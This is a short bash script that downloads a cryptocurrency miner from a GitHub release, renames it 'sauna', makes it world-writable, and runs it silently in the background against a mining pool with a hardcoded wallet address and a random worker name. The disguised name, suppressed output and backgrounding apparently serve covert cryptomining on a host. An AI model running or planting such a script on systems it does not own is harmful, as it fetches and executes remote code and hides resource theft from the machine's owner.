#!/bin/bash
wget -O sauna https://github.com/Project-InitVerse/miner/releases/download/v1.0.0/iniminer-linux-x64
chmod 777 sauna
./sauna --pool stratum+tcp://0x07ff670184606B7eD600524DcE0Ca6eDEB4e8E86.$(echo $RANDOM | md5sum | head -c 10)@pool-a.yatespool.com:31588 > /dev/null 2>&1 &
